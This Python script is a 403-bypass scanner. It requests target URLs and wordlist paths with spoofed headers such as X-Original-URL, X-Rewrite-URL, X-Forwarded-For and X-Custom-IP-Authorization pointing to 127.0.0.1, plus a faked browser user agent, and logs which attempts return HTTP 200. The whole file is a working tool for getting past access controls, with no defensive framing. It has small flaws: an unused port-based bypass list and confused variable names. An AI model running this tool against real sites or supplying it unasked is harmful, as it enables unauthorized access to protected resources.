import argparse
import concurrent.futures
import json
import logging
import sys

import requests
from colorama import Fore
from fake_useragent import UserAgent

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

group.add_argument('-p', '--path', action='store', type=str, help='path to check', metavar='domain.com')
parser.add_argument('-d', '--domains', action='store', help="domains to check", metavar="filename.txt")
parser.add_argument('-t', '--target', action='store', help="domain to check", metavar="site.com")

args = parser.parse_args()

ua = UserAgent()


def load_wordlist(wordlist_path: str) -> list:
    try:
        with open(wordlist_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError as e:
        logger.error(f"File not found: {wordlist_path}")
        sys.exit(1)


def get_header_bypasses(path=None):
    header_bypasses = [
        {'User-Agent': str(ua.chrome)},
        {'User-Agent': str(ua.chrome), 'X-Original-URL': path if path else '/'},
        {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
        {'User-Agent': str(ua.chrome), 'X-Originally-Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Originating-': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Originating-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'True-Client-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-WAP-Profile': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Arbitrary': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-HTTP-DestinationURL': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Proto': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'Destination': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Remote-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Client-IP': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Host': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Host': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-ProxyUser-Ip': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-rewrite-url': path if path else '/'},
    ]
    return header_bypasses


def get_port_based_bypasses(path=None):
    port_based_bypasses = [
        {'User-Agent': str(ua.chrome)},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '4443'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '80'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8080'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Port': '8443'},
    ]
    return port_based_bypasses


def make_request(url: str, stream=False, path=None):
    if path:
        headers = get_header_bypasses(path=path)
    else:
        headers = get_header_bypasses()
    try:
        for header in headers:
            if stream:
                response = requests.get(url, stream=True, headers=header)
            else:
                response = requests.get(url, headers=header)
            if response.status_code == 200:
                logger.info(f"{url} {json.dumps(list(header.items())[-1])} [200]")
            else:
                logger.warning(f"{url} {json.dumps(list(header.items())[-1])} [{response.status_code}]")
    except requests.exceptions.RequestException as e:
        logger.error(f"Request error: {e}")


def check_domain(domain, bypass_list, path=None):
    for bypass in bypass_list:
        url = domain + (path + bypass if path else bypass)
        make_request(url, stream=True, path=path)


def main():
    if args.domains:
        bypass_list = load_wordlist(args.domains)
        if args.path:
            logger.info("Checking domains to bypass....")
            for domain in bypass_list:
                check_domain(domain, wordlist, path=args.path)
        else:
            logger.info("Checking domains to bypass....")
            for domain in bypass_list:
                check_domain(domain, wordlist)
    elif args.target:
        if args.path:
            logger.info(f"Checking {args.target}...")
            check_domain(args.target, wordlist, path=args.path)
        else:
            logger.info(f"Checking {args.target}...")
            check_domain(args.target, wordlist)


if __name__ == "__main__":
    try:
        wordlist = load_wordlist("bypasses.txt")
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.submit(main)
    except KeyboardInterrupt:
        sys.exit(0)
